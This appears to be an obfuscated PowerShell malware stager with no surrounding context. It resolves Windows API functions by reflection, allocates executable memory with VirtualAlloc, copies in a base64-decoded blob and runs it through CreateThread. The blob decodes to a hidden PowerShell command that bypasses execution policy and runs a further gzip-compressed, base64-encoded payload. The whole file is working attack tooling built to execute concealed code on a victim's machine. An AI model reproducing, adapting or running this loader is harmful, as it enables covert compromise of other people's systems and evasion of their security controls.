function xZg6 {
	Param ($r2l, $yH)		
	$qQfO = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	
	return $qQfO.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($qQfO.GetMethod('GetModuleHandle')).Invoke($null, @($r2l)))), $yH))
}

function f9Al {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $cN,
		[Parameter(Position = 1)] [Type] $jljK = [Void]
	)
	
	$vp = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$vp.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $cN).SetImplementationFlags('Runtime, Managed')
	$vp.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $jljK, $cN).SetImplementationFlags('Runtime, Managed')
	
	return $vp.CreateType()
}

[Byte[]]$xkF7 = [System.Convert]::FromBase64String("cG93ZXJzaGVsbC5leGUgLW5vcCAtdyBoaWRkZW4gLW5vbmkgLWVwIGJ5cGFzcyAiJihbc2NyaXB0YmxvY2tdOjpjcmVhdGUoKE5ldy1PYmplY3QgSU8uU3RyZWFtUmVhZGVyKE5ldy1PYmplY3QgSU8uQ29tcHJlc3Npb24uR3ppcFN0cmVhbSgoTmV3LU9iamVjdCBJTy5NZW1vcnlTdHJlYW0oLFtDb252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygnSDRzSUFOOUpBMXNDQTUxV1hXL2JOaFI5OTYrNGNMVmFRaXpDZGxHMEM1QmlxWkp1QWJMV3FMemx3VEFRbXJxT3RjaWtTMUwrUU9ML1BsS2lMRGxPMEdWNnNVVmVubnZ1dVIvVUd4aUtOY3BaemlHRUc1bHFqUnltVy9oc2ZrYTU1Q2poTFZ6UUZjSWZWQ2JiVnN0WU1wMEtEcitqRG05d3lySVV1WWJXUXd2TTQ2MFpuTUZYWElmZnB2OGcweENPdGt2OFNoZG9GalV4OWxGaFh4bVR2eFJlNEl6bW1ZNGtKbVlucFpreUVKNldPZTZ0aGxKc3R1U0poVmx2ckZTMnJWMU5jVm1GMW5xQVluOUlKVjM0NWY5eHJHWEs3eVplSkJZTHlwUHU0V3FzTWliNGs4VUxzZWFab0VteEdqaE1LUmdxQlU2QWhVanlEQzNCMy93QVNwTjBCbjdsQmtMOEFlMXB5cE4yVUd5VzU0cXpXYXFNL0VieU0rTnlhLzR2aUZVdEZ1d2V0U0lqdHJ4MkZwUCt1M2Nmamc4U3BhblUxcS96WE95NkZKMDE3TTRadzZVMmdHVTYvSkxLN2lXNkVsY29GUjR6M2tNM1V2NGM4MmpvSExWLy9VRDZneDc1MkNlRHdjZDIxOGJobkxkS0FaV1dTQmVXYlFsT1RLSEZ4WnBoV2ZNcjgxUFNzN1hTZHVsb2tGTXFpeXV3Ri9naHkwM05iMGxjbWZyT2Y5ZWJtYUxDcnYvZ2pRejZEa0txWUh4dzVqc3VoTVlJcFU1bkthTWEvNlpabWxCYmVSSE5zaWxsOTVNZ2VJWU9PYy8xM0phdFBYU3VubGNtYUNTd2xxUU9xYW5aZUxyVk9KNU1QUHRyUzY5SHlLQm5uc2RmSG5vN0p5dnlwTnIyeHhvM21pQm5JckYxZlhwNkhrZFhWNEdWK3JPMThkczNwa0RGV3BYVElaNWpsb0hNT1RmV1lJVElsU25TTnB5QWgzeDFhdCs0YmZFVHMyWnlzdDlnWXJITWRiMTV5eU94M01yMGJxN0Jqd0lZOVBydjRjK1VTYUhFVEVNazVGTElRa0FDNTlhanRWUWcwVGhZWVVKdStTMTNOZWcwSVhaa29WOUgxKzExNnhkeWpmeE96NXRsVTNWd3MzQ082dVoxVW8xUEpuQnRJSzAycnZ2Sm51ZnJ1VmFudmdoNVNkbmNjQzVCSWVYNzZWSmIxYlR0NHg4TTVZQlUwWmJ6cTBJS0hxLzRTdHhqZUxsWkdtMlYwWHVQc2p2c3hWY3AwUm5HMERGNUxsaGNDMVprTWlCRHF1ZG10Zk9wODc5VHQ1Nm5HZnErbHhZOVVCNy9qalR4eTRydlFxOEwzc0c1QUVLTzBEdks3YVdsajhuSWhQTFNSZVhtZ3pVaFJZaVhMdVFheFhRNXRWUWFhRzVNRlRKWDRZQ1hCay9LeWd3RnErVlJBaUNzQm00SlB2ajB0ZytQOEMzWFlZa0tUb29EcUFFVWdsVEFSdVNmcEFBNk5jakdFdkZRU2lISHZjbUJzd2JyWXArd0RLbjBnK2NZbkRWZlRPTnZXc2VkOUovS3A0YjVhZXMwUytXb2Nhb3pYN0pjemZkM3NCdUQ3azZKTXFIUXhWUGZpckVXeStvcU5OOFJyZjMzd3o0NTdpS0UwRjAvZG9EOEMxYmlrSjlEQ1FBQScpKSksW0lPLkNvbXByZXNzaW9uLkNvbXByZXNzaW9uTW9kZV06OkRlY29tcHJlc3MpKSkuUmVhZFRvRW5kKCkpKSI=")
		
$i_ = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((xZg6 kernel32.dll VirtualAlloc), (f9Al @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $xkF7.Length,0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($xkF7, 0, $i_, $xkF7.length)

$abF = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((xZg6 kernel32.dll CreateThread), (f9Al @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$i_,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((xZg6 kernel32.dll WaitForSingleObject), (f9Al @([IntPtr], [Int32]))).Invoke($abF,0xffffffff) | Out-Null